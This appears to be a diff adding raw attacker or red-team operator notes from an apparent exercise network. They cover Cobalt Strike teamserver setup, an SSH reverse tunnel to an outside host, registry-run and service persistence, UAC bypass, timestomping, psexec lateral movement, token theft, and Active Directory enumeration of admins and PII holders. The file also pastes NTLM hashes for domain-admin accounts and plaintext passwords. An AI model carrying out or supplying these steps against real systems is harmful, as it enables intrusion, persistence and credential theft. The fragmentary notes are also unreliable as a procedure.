@@ -1,0 +1,122 @@
+//.....nmap scanning
+nmap -sT 172.16.10.10/24 -T5 --top-ports 1000 -oA scanof_172.16.10.0-24 -n
+
+
+
+shell sc qc WIN6499
+shell sc delete WIN6499
+
+Taskkill /PID 2400 /F
+rm WIN6499.exe
+upnpcont.exe
+tar -xvf cobaltstrike-trial.tgz 
+
+~/cobaltstrike# ./teamserver 74.28.31.46 josh1
+
+root@kali:~/cobaltstrike# ./cobaltstrike
+
+ssh -R 74.28.31.46:443:127.0.0.1:443 root@74.28.31.46
+
+G4e!n@krj9
+
+run macro
+
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WIN6499" /t REG_SZ /F /D "C:\Users\guy.fleegman\AppData\local\Temp\WIN6499.exe"
+shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v win6499  /f
+//del..... need to be in same  reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v win6499  /f
+
+
+shell shutdown /r /t 0 /f
+
+runas SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX c:\users\Public\WIN6499.exe
+
+bypassuac
+
+//remind..... create sc exe payload
+shell sc create WIN6499 binpath= "C:\Windows\System32\WIN6499.exe" start= auto DisplayName= "windows x6499 manager"
+
+shell sc description WIN6499 "This is for Nick and Wimpy to see my service"
+shell sc start WIN6499
+timestomp WIN6414.exe desktop.ini
+
+//remind..... must get domain&user first
+NYC.local\Guy.Fleegman.da RLd24nql34pcvX  NYC.local\Guy.Fleegman.da RLd24nql34pcvX
+                          RLd24nql34pcvX
+psexec_psh 172.16.20.194
+psexec_psh 172.16.10.10
+
+172.16.10.10
+
+RLd24nql34pcvX
+172.16.20.194
+
+shell dsquery.exe * -filter "(name=domain admins)" -attr * -limit 1 -NYC
+SPRWS-19.spr.ershon.local or 172.16.20.144
+
+shell dsquery.exe * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection
+
+shell dsquery.exe * -filter "(objectclass=user)" -attr * -limit 2 -d spr.ershon.local
+shell dsquery.exe * -filter "(objectclass=user)" -attr *PII* -limit 2 -d NYC
+"&(objectClass=person)(objectCategory=user)"
+shell dsquery.exe * -filter "&(objectClass=computer)(operatingSystem=*7*)" -attr * -limit 2 -d spr.ershon.local
+shell dsquery.exe * -filter "(objectclass=user)" -attr cn Patrick -limit 0
+shell dsquery.exe * -filter "(objectclass=user)" -attr name description *pii* -limit 0
+dsquery * -filter "&(objectClass=person)(objectCategory=user)" -attr cn lastLogonTimestamp -limit 2
+Patrick, Workman J     109859280         PII Manager  
+Patrick, Workman J      PII Manager
+wevtutil qe security /rd:true /f:text /q:"*[System/EventID=4634 and 4624] and *[EventData/Data[@Name='TargetUserName']='Patrick, Workman J ']" /c:20 
+
+172.16.5.10
+ERSHON-DC1.ershon.local
+
+PS   -he's loged on 
+steal_token need PID
+
+
+ERSHON\Administrator 2e7a68fd33788be92f5da8889c66c3a3
+shell dsquery.exe * -filter "(name=Domain Admins)" -attr * -limit 1 -d NYC.local
+shell dsquery.exe * -filter "(admincount=1)" -attr name samaccountname description -limit 10 -d NYC
+shell dsquery.exe * -filter "(admincount=1)" -attr name samaccountname description -limit 1 -d NYC
+
+member: CN=Roger\, Ingersol X,OU=Users,OU=IT,OU=NYC,DC=nyc,DC=ershon,DC=local
+member: CN=Fred\, Kwan X,OU=Users,OU=IT,OU=NYC,DC=nyc,DC=ershon,DC=local
+member: CN=Alexander\, Dane W,OU=Users,OU=IT,OU=NYC,DC=nyc,DC=ershon,DC=local
+member: CN=Gwen\, DeMarco S,OU=Users,OU=IT,OU=NYC,DC=nyc,DC=ershon,DC=local
+member: CN=Jason\, Nesmith F,OU=Users,OU=IT,OU=NYC,DC=nyc,DC=ershon,DC=local
+
+ERSHON-DC1\Roc.Ingersol.da 129193a7e037600162a592f439124912
+NYC\Roc.Ingersol.da 129193a7e037600162a592f439124912
+member: CN=Administrator,CN=Users,DC=nyc,DC=ershon,DC=local
+NYC-DC1\Administrator 2e7a68fd33788be92f5da8889c66c3a3
+NYC\Roger.Ingersol.da 129193a7e037600162a592f439124912
+
+NYC-DC1.nyc.ershon.local
+
+NYC-DC1.nyc.ershon.local
+Name:    NYC-DC1.nyc.ershon.local
+Address:  172.16.10.10
+
+ERSHON-DC1\Alan.Lazarus.ea faf488950524b5eebc29cee11f2955c6
+NYC\Alan.Lazarus.ea faf488950524b5eebc29cee11f2955c6
+
+NYC\Alan.Lazarus.ea faf488950524b5eebc29cee11f2955c6
+
+beacon> shell ping NYC-DC1.NYC.ershon.local
+[*] Tasked beacon to run: ping NYC-DC1.NYC.ershon.local
+[+] host called home, sent: 37 bytes
+[+] received output:
+
+Pinging nyc-dc1.nyc.ershon.local [172.16.10.10] with 32 bytes of data:
+Reply from 172.16.10.10: bytes=32 time<1ms TTL=127
+
+
+
+C:\windows\system32\cmd.exe
+=======
+exitC:\scripts\putty.exe user@172.16.10.101
+
+
+172.16.10.101 - PuTTY  Patrick.Workman  
+=======
+vy2*jH5!pS
